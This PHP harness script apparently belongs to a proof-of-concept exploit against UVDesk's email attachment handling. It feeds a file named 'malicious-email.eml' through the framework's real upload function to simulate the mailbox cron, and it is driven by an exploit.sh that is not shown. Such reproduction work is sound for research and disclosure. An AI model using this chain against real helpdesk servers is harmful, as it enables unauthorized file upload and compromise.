<?php
// Real, unmodified core-framework@3b31910 Localhost::uploadEmailAttachment(),
// called exactly as TicketService::saveThreadEmailAttachments() calls it
// (no 3rd arg). Invoked live by exploit.sh via `docker exec` to represent
// the mailbox-refresh cron ingesting the attacker's email.
require __DIR__ . '/vendor/autoload.php';
require __DIR__ . '/src/TokenGenerator.php';
require __DIR__ . '/src/FileUploadServiceInterface.php';
require __DIR__ . '/src/Localhost.php';

use Symfony\Component\DependencyInjection\Container;
use Symfony\Component\HttpFoundation\RequestStack;
use Webkul\UVDesk\CoreFrameworkBundle\FileSystem\UploadManagers\Localhost;
use PhpMimeMailParser\Parser;

class FakeKernel { public function getProjectDir() { return '/var/www/app'; } }

$container = new Container();
$container->set('kernel', new FakeKernel());
$uploadManager = new Localhost($container, new RequestStack());

$parser = new Parser();
$parser->setText(file_get_contents(__DIR__ . '/malicious-email.eml'));

foreach ($parser->getAttachments() as $attachment) {
    $result = $uploadManager->uploadEmailAttachment($attachment, 'threads/999');
    echo $result['path'];
}
